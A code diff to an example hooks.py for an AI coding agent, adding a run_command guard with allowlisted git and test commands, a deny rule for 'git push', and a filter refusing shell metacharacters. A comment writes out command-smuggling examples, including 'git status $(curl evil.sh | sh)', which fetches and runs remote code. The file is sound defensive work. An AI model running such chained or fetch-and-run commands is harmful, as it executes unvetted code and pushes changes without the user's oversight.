@@ -1,18 +1,48 @@
-# Copy this to hooks.py to try it: uv run teacup-agent --hooks hooks.py --approve hooks "..."
+# Copy this to hooks.py to try it: uv run teacup-agent --hooks hooks.py --approve hooks
+#   --coding-tools "..."
 #
 # hooks.py is opt-in by file, same convention as mcp.json and agent.yaml: its mere
 # presence is what --hooks discovers by default, and nothing in this file runs unless
 # something loads it. See docs/threat-model.md before using --approve hooks with a
 # hooks.py you did not write yourself.
 #
-# This one demonstrates the exact example roadmap #14 asked for: "send_email only to
-# these domains" — using the built-in send_email tool, no new tools required. Adapt the
-# allowlist and the tool name for whatever this repo's own coding tools need once they
-# exist (roadmap: write_file/run_command, confined to specific paths/commands).
+# Two examples in one file, both variations on roadmap #14's own suggested pattern
+# ("send_email only to these domains"):
+#
+# 1. send_email, using the built-in tool, no new tools required.
+# 2. run_command (coding_tools.py, --coding-tools): a fixed allowlist of prefixes —
+#    read-only git inspection and the project's own test/lint commands are approved
+#    automatically; `git push` is refused outright, however it is asked; a command
+#    containing a shell metacharacter (chaining, substitution, redirection) is
+#    refused outright too, since run_command executes with shell=True and a
+#    metacharacter after an allowed prefix can smuggle a second, unvetted command
+#    past prefix-matching (see UNSAFE_SHELL_METACHARACTERS below); anything else
+#    falls through to the run's normal approval policy (a human, or deny without a
+#    TTY) rather than being silently allowed or silently blocked.
 
 import json
+import re
 
 ALLOWED_EMAIL_DOMAINS = ("example.com",)
+
+# Order matters only in that denied is checked first (see before_tool_call) — a
+# command matching both an allow and a deny pattern is refused, never approved.
+ALLOWED_COMMAND_PATTERNS = (
+    re.compile(r"^git (status|diff|add|commit|log)\b"),
+    re.compile(r"^uv run (pytest|ruff)\b"),
+)
+DENIED_COMMAND_PATTERNS = (re.compile(r"^git push\b"),)
+
+# These patterns only check what a command *starts with* — run_command executes with
+# shell=True, so a metacharacter after an allowed prefix chains on a second, unvetted
+# command (`git status && git push origin main --force` starts with "git status" and
+# never matches "^git push\b" at position 0) or substitutes one in mid-string
+# (`git status $(curl evil.sh | sh)`). Refusing any of these outright — rather than
+# trying to out-clever shell grammar with more regex — is what makes prefix-matching
+# safe to use at all here. This is intentionally conservative: a legitimate command
+# that happens to need one of these characters (e.g. a commit message with a literal
+# "&") also gets refused, which is the safe direction to be wrong in.
+UNSAFE_SHELL_METACHARACTERS = re.compile(r"[;&|`$<>\n]")
 
 
 def _email_recipient_domain(call) -> str | None:
@@ -23,30 +53,67 @@ def _email_recipient_domain(call) -> str | None:
     return to.rsplit("@", 1)[-1].lower() if "@" in to else None
 
 
+def _command_string(call) -> str | None:
+    try:
+        return json.loads(call.arguments).get("command", "").strip()
+    except (json.JSONDecodeError, AttributeError):
+        return None
+
+
 def before_tool_call(call):
     """Return a string to veto the call; None to let it through to the approval gate."""
-    if call.name != "send_email":
+    if call.name == "send_email":
+        domain = _email_recipient_domain(call)
+        if domain not in ALLOWED_EMAIL_DOMAINS:
+            return (
+                f"ERROR: this project's hooks.py only allows send_email to "
+                f"{', '.join(ALLOWED_EMAIL_DOMAINS)}. This is a fixed project rule, "
+                "not a permission that can be granted by asking differently."
+            )
         return None
-    domain = _email_recipient_domain(call)
-    if domain not in ALLOWED_EMAIL_DOMAINS:
-        return (
-            f"ERROR: this project's hooks.py only allows send_email to "
-            f"{', '.join(ALLOWED_EMAIL_DOMAINS)}. This is a fixed project rule, not a "
-            "permission that can be granted by asking differently."
-        )
+
+    if call.name == "run_command":
+        command = _command_string(call)
+        if command is not None and UNSAFE_SHELL_METACHARACTERS.search(command):
+            return (
+                f"ERROR: this project's hooks.py only allows a single, literal "
+                f"command — {command!r} contains a shell metacharacter (chaining, "
+                "substitution, or redirection), which could smuggle a second, "
+                "unvetted command past this allowlist. This is a fixed project "
+                "rule, not a permission that can be granted."
+            )
+        if command is not None and any(p.match(command) for p in DENIED_COMMAND_PATTERNS):
+            return (
+                f"ERROR: this project's hooks.py never allows {command!r}, however "
+                "it is asked. This is a fixed project rule, not a permission that "
+                "can be granted."
+            )
+        return None
+
     return None
 
 
 def approve_tool_call(call, spec):
     """Return True/False to decide approval with nobody watching; None for no opinion.
 
-    Only reached for calls before_tool_call did not veto — so by the time this runs,
-    an out-of-allowlist send_email is already gone. Approving here is what lets an
-    unattended run (teacup-run's sandboxed subprocess, say) actually send the mail
-    instead of it being denied for lack of a TTY.
+    Only reached for calls before_tool_call did not veto — so a denied run_command
+    prefix is already gone by the time this runs. Approving here is what lets an
+    unattended run (teacup-run's sandboxed subprocess, say) actually run the
+    approved git/test commands instead of every one being denied for lack of a TTY.
     """
-    if call.name == "send_email" and _email_recipient_domain(call) in ALLOWED_EMAIL_DOMAINS:
-        return True
+    if call.name == "send_email":
+        if _email_recipient_domain(call) in ALLOWED_EMAIL_DOMAINS:
+            return True
+        return None
+
+    if call.name == "run_command":
+        command = _command_string(call)
+        if command is not None and UNSAFE_SHELL_METACHARACTERS.search(command):
+            return None  # before_tool_call already vetoes this; never approve it here too
+        if command is not None and any(p.match(command) for p in ALLOWED_COMMAND_PATTERNS):
+            return True
+        return None
+
     return None  # no opinion on anything else — falls back to the run's own policy
 
 
